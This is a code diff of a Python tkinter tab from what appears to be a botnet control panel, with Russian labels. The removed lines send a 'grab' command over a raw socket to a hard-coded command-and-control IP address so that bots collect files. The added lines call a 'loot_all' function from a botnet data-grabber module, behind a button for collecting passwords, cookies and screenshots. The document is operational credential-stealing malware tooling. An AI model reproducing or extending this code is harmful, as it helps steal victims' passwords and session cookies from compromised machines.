@@ -1,37 +1,15 @@
 import tkinter as tk
-from tkinter import ttk, messagebox
-import threading, socket, json
-from gui.widgets import RightClickMenu
+from tkinter import messagebox
+from botnet.datagrabber import loot_all
 
-class ExfilTab:
-    def __init__(self, notebook, app):
-        self.app = app
-        self.frame = ttk.Frame(notebook)
-        self._create_widgets()
+class ExfilTab(tk.Frame):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.build_ui()
 
-    def _create_widgets(self):
-        main = ttk.Frame(self.frame, padding=10)
-        main.pack(fill=tk.BOTH, expand=True)
+    def build_ui(self):
+        tk.Button(self, text="Запустить сбор данных (пароли/куки/скриншот)", command=self.start_exfil).pack(pady=20)
 
-        ttk.Label(main, text="Захват данных с ботов", font=("Arial", 12, "bold")).pack(anchor='w')
-        ttk.Label(main, text="Команда будет отправлена на C2, боты выполнят сбор файлов.").pack()
-        ttk.Button(main, text="Запустить граб (на всех ботах)", command=self.start_grab).pack(pady=10)
-
-        self.log = tk.Text(main, height=8, bg='white')
-        self.log.pack(fill=tk.BOTH, expand=True)
-        RightClickMenu(self.log)
-
-    def start_grab(self):
-        def send():
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
-                s.connect(("80.249.146.202", 80))
-                s.sendall(b"grab:")
-                resp = s.recv(1024)
-                s.close()
-                self.log.insert(tk.END, f"[+] Ответ C2: {resp.decode()}\n")
-            except Exception as e:
-                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
-        threading.Thread(target=send, daemon=True).start()
-        self.log.insert(tk.END, "[*] Команда граб отправлена\n")
+    def start_exfil(self):
+        loot_all()
+        messagebox.showinfo("Exfil", "Сбор данных завершён")
